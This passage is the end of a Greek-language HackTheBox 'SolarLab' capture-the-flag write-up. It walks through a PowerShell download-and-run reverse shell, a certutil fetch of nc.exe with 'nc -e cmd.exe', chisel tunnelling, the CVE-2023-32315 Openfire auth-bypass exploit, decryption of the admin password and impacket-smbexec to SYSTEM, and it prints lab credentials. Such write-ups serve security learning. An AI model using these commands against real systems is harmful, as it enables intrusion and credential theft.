+    <div class="term-body"><span class="pco"># Εισηγμένο στο πεδίο justification (HTML rendered από το ReportLab)</span>
+<span class="py">powershell.exe -c iex (iwr -UseBasicParsing http://10.10.14.63/Invoke-PowerShellTcpEx.ps1)</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">sudo nc -lvnp 5555</span>
+<span class="po">listening on [any] 5555 ...
+connect to [10.10.14.63] from (UNKNOWN) [10.10.11.16] 53730
+Windows PowerShell running as user blake on SOLARLAB</span>
+<span class="pg">PS C:\Users\blake\Documents\app&gt;</span></div>
+  </div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-26-d9dfe8ff1f.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-26-d9dfe8ff1f.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Reverse shell received as blake on SOLARLAB" width="720" height="355"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-27-44df98227c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-27-44df98227c.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="whoami and whoami /priv showing blake's privileges" width="720" height="326"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-28-cf446f08c8.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-28-cf446f08c8.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="ipconfig and user.txt flag" width="720" height="249"></picture>
+
+  <div class="alert alert-success">&#128681; User flag αποκτήθηκε ως <strong>solarlab\blake</strong>.</div>
+
+  <h2>Πλευρική κίνηση &#8212; blake &#8594; openfire</h2>
+  <h3>Ανακάλυψη credentials στη βάση δεδομένων της εφαρμογής</h3>
+  <p>Μέσα στο <code>C:\Users\blake\Documents\app\instance</code>, υπάρχει ένα αρχείο SQLite <code>users.db</code> που περιέχει όλα τα credentials της εφαρμογής:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-29-a4f17d9f8c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-29-a4f17d9f8c.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="users.db contents showing alexanderk, claudias, blakeb credentials" width="614" height="227"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-30-79a7f925de.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-30-79a7f925de.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Credential summary: blakeb, alexanderk, claudias" width="720" height="191"></picture>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">credentials από το users.db</span></div>
+    <div class="term-body"><span class="py">blakeb     : ThisCanB3typedeasily1@</span>
+<span class="py">alexanderk : HotP!fireguard</span>
+<span class="py">claudias   : 007poiuytrewq</span></div>
+  </div>
+
+  <h3>Openfire — port forwarding</h3>
+  <p>Ελέγχοντας τις ενεργές συνδέσεις και τον φάκελο <code>C:\Users</code> αποκαλύπτεται ένας χρήστης <code>openfire</code> και το Openfire να ακούει στο <code>127.0.0.1:9090</code>:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-31-d32476d818.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-31-d32476d818.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="C:\Users showing Administrator, blake, openfire, Public" width="720" height="178"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-32-c4a28ad1e6.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-32-c4a28ad1e6.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Netstat showing Openfire on 127.0.0.1:9090" width="720" height="110"></picture>
+
+  <p>Το WinPEAS επιβεβαιώνει τα credentials στο <code>utils.py</code> και δεν αποκαλύπτει τίποτα επιπλέον:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-33-d9fe825142.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-33-d9fe825142.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="WinPEAS output showing hardcoded credentials in utils.py" width="720" height="345"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-34-1dc2ca3ae7.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-34-1dc2ca3ae7.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="C:\Program Files showing Openfire and RUXIM directories" width="720" height="425"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-35-e668b0d56d.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-35-e668b0d56d.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Access denied when trying to cd into Openfire directory" width="720" height="115"></picture>
+
+  <p>Ο φάκελος Openfire είναι απρόσιτος ως <code>blake</code> — χρειαζόμαστε πρώτα τον χρήστη <code>openfire</code>. Κάνουμε forward το port 9090 με το chisel:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">chisel &#8212; port forward 9090</span></div>
+    <div class="term-body"><span class="pco"># Kali — εκκίνηση chisel server</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">chisel server --socks5 --reverse -p 1234</span>
+
+<span class="pco"># Target — connect back και tunnel του port 9090</span>
+<span class="po">PS C:\Users\blake\Documents\app&gt; .\chiselx86_64.exe client 10.10.14.63:1234 R:9090:127.0.0.1:9090</span></div>
+  </div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-36-d9591573ce.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-36-d9591573ce.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Chisel server running on Kali with session established" width="720" height="373"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-37-01d49b0819.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-37-01d49b0819.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Chisel client on target connecting back" width="720" height="287"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-38-39cd44f527.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-38-39cd44f527.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Openfire Administration Console login page on 127.0.0.1:9090" width="720" height="155"></picture>
+
+  <h3>CVE-2023-32315 &#8212; Openfire Auth Bypass</h3>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-39-7a1d77c41f.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-39-7a1d77c41f.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Google search for Openfire RCE CVE-2023-32315" width="720" height="304"></picture>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">exploit CVE-2023-32315</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/Documents/HTB/solarlab</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">git clone https://github.com/miko550/CVE-2023-32315.git && cd CVE-2023-32315</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/Documents/HTB/solarlab/CVE-2023-32315</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">python3 CVE-2023-32315.py -t http://127.0.0.1:9090</span>
+<span class="pg">User added successfully: url: http://127.0.0.1:9090 username: m87vm2 password: ky4kb6</span></div>
+  </div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-40-e0d0db175b.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-40-e0d0db175b.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="CVE-2023-32315 exploit output — new user added" width="720" height="300"></picture>
+
+  <p>Κάνουμε login με τον νεοδημιουργημένο χρήστη, μετά ανεβάζουμε το plugin <code>openfire-management-tool-plugin.jar</code>:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-41-c86e9a35bc.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-41-c86e9a35bc.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Openfire admin dashboard after successful login" width="720" height="202"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-42-f46f814364.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-42-f46f814364.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Plugin upload page with openfire-management-tool-plugin.jar" width="693" height="270"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-43-68d714acc8.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-43-68d714acc8.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Management tool login interface" width="720" height="220"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-44-71ce370ef5.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-44-71ce370ef5.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Management tool command execution — whoami showing solarlab\openfire" width="720" height="149"></picture>
+
+  <p>Εκτελούμε ένα reverse shell μέσω του management tool για να πάρουμε κανονικό shell ως <code>openfire</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">shell openfire μέσω management tool</span></div>
+    <div class="term-body"><span class="pco"># Upload του nc.exe και εκτέλεση μέσω management tool</span>
+<span class="po">certutil -urlcache -f http://10.10.14.63/nc.exe nc.exe
+nc.exe 10.10.14.64 4444 -e cmd.exe</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">sudo nc -lvnp 4444</span>
+<span class="po">C:\Program Files\Openfire\bin&gt; whoami</span>
+<span class="pg">solarlab\openfire</span></div>
+  </div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-45-f9c1599252.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-45-f9c1599252.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="nc shell received as solarlab\openfire" width="720" height="269"></picture>
+
+  <h2>Privilege Escalation &#8212; openfire &#8594; Administrator</h2>
+  <h3>Openfire embedded-db</h3>
+  <p>Ως <code>openfire</code>, μπορούμε τώρα να έχουμε πρόσβαση στον φάκελο Openfire. Ο φάκελος <code>embedded-db</code> περιέχει τα αρχεία της βάσης δεδομένων:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-46-3db7029967.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-46-3db7029967.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="C:\Program Files\Openfire\embedded-db directory listing" width="720" height="293"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-47-c6e3a8defe.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-47-c6e3a8defe.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="openfire.script file showing INSERT statements" width="720" height="359"></picture>
+
+  <p>Το <code>openfire.script</code> περιέχει τον πίνακα <strong>OFUSER</strong> με τον κρυπτογραφημένο κωδικό του admin:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-48-76f4e72ab9.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-48-76f4e72ab9.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="INSERT INTO OFUSER showing admin encrypted password hash" width="697" height="169"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-49-2bbf335d98.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-49-2bbf335d98.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="OFUSER table structure and data" width="720" height="257"></picture>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">κρυπτογραφημένος κωδικός admin</span></div>
+    <div class="term-body"><span class="po">INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4Ye...</span>
+<span class="py">becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442</span><span class="po">&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,...)</span></div>
+  </div>
+
+  <h3>Εύρεση του κλειδιού blowfish</h3>
+  <p>Ο πίνακας OFPROPERTY στο ίδιο script περιέχει το <code>passwordKey</code> που χρησιμοποιείται για κρυπτογράφηση blowfish:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-50-2b1f1f4bc5.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-50-2b1f1f4bc5.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="INSERT INTO OFPROPERTY showing passwordKey=hGXiFzsKaAeYLjn" width="720" height="245"></picture>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">passwordKey από OFPROPERTY</span></div>
+    <div class="term-body"><span class="py">INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL)</span></div>
+  </div>
+
+  <h3>Αποκρυπτογράφηση του κωδικού admin</h3>
+
+
+  <p>Χρησιμοποιούμε το Java-based εργαλείο <code>c0rdis/openfire_decrypt</code> (η έκδοση PHP δεν δουλεύει):</p>
+
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">αποκρυπτογράφηση κωδικού admin</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/Documents/HTB/solarlab/openfire_decrypt</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">javac OpenFireDecryptPass.java</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/Documents/HTB/solarlab/openfire_decrypt</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">java OpenFireDecryptPass becb0c67cfec...59d442 hGXiFzsKaAeYLjn</span>
+<span class="pg">ThisPasswordShouldDo!@ (hex: 005400680069...)</span></div>
+  </div>
+
+  <div class="alert alert-success"><strong>admin : ThisPasswordShouldDo!@</strong></div>
+
+  <h3>Code execution ως SYSTEM</h3>
+  <p>Επιβεβαιώνουμε τα credentials του administrator πάνω σε SMB και εκτελούμε μέσω impacket-smbexec:</p>
+
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">impacket-smbexec &#8212; SYSTEM</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/Documents/HTB/solarlab/openfire_decrypt</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">impacket-smbexec administrator:&#39;ThisPasswordShouldDo!@&#39;@solarlab.htb</span>
+<span class="po">Impacket v0.11.0 - Copyright 2023 Fortra
+[!] Launching semi-interactive shell - Careful what you execute</span>
+<span class="po">C:\Windows\system32&gt; whoami</span>
+<span class="pg">nt authority\system</span></div>
+  </div>
+
+
+  <div class="alert alert-success">&#128681; Root flag αποκτήθηκε. Το machine pwned.</div>
+
+  <h2>Σύνοψη</h2>
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Τεχνικη</th><th>Εργαλειο</th></tr>
+    <tr><td>Αναγνώριση</td><td>SMB ανώνυμη ανάγνωση &#8594; xlsx με creds</td><td>smbclient</td></tr>
+    <tr><td>Subdomain</td><td>DNS brute-force &#8594; report.solarlab.htb</td><td>gobuster</td></tr>
+    <tr><td>Foothold</td><td>CVE-2023-33733 ReportLab HTML-to-PDF RCE</td><td>Burp, nc</td></tr>
+    <tr><td>Πλευρική κίνηση (openfire)</td><td>CVE-2023-32315 Openfire auth bypass &#8594; mgmt plugin RCE</td><td>python3, chisel</td></tr>
+    <tr><td>Root</td><td>Αποκρυπτογράφηση blowfish του κωδικού admin του Openfire από το embedded-db</td><td>java, impacket</td></tr>
+  </table>
+
+  <h2>Βασικές εντολές</h2>
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">γρήγορη αναφορά</span></div>
+    <div class="term-body"><span class="pco"># SMB enumeration</span>
+<span class="pc">smbclient -N //solarlab.htb/Documents</span>
+
+<span class="pco"># Ανακάλυψη subdomain</span>
+<span class="pc">gobuster dns -d solarlab.htb -w subdomains-top1million-10000.txt</span>
+
+<span class="pco"># Port forwarding μέσω chisel</span>
+<span class="pc">chisel server --socks5 --reverse -p 1234          # Kali</span>
+<span class="pc">chiselx86_64.exe client &lt;IP&gt;:1234 R:9090:127.0.0.1:9090  # Target</span>
+
+<span class="pco"># Openfire auth bypass</span>
+<span class="pc">python3 CVE-2023-32315.py -t http://127.0.0.1:9090</span>
+
+<span class="pco"># Αποκρυπτογράφηση κωδικού Openfire</span>
+<span class="pc">javac OpenFireDecryptPass.java</span>
+<span class="pc">java OpenFireDecryptPass &lt;enc_password&gt; &lt;blowfish_key&gt;</span>
+
+<span class="pco"># SMBexec ως Administrator</span>
+<span class="pc">impacket-smbexec administrator:&#39;ThisPasswordShouldDo!@&#39;@solarlab.htb</span></div>
+  </div>
+
+</div>
+
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>&#169; 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">&#8592; Όλα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
